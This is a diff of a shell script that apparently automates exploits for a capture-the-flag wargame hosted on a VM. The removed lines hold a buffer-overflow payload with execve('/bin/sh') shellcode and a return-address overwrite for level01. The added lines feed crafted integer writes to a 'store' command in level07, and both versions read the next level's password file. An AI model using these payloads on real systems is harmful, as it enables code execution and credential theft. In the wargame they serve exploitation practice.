@@ -29,15 +29,13 @@ fi
 
 act_level_password=$(cat "../level0${PREVIOUS_LEVEL}/flag")
 
-sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'python -c "print \"dat_wil\" + \"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\" + \"\n\" + \"a\"*64 + \"b\"*16 + \"\x47\xa0\x04\x08\"" > /tmp/level01_overflow; echo "cat /home/users/level02/.pass" > /tmp/level01_cmd' 2> /dev/null
+sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo -e "store\n4159090384\n2147483762\nstore\n4160264172\n116\nquit" > /tmp/level07_val; echo "cat /home/users/level08/.pass" > /tmp/level07_command' 2> /dev/null
 
-flag=""
-cnt=0
-while [ -z "${flag}" ] && [ "${cnt}" -lt 40 ]
-do
-    flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level01_overflow /tmp/level01_cmd | ./level01' 2> /dev/null | grep --max-count=1 '^[a-zA-Z0-9]\{40\}$' | head --line=1)
+echo "Enter command:"
+echo "  cat /tmp/level07_val - /tmp/level07_command | ./level07 | grep -a -o '[0-9A-Za-Z]\{40\}'"
+echo
+echo "Then Ctrl-D"
 
-    let cnt++
-done
+sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 2> /dev/null
 
 echo -e "FLAG:\n${flag}"
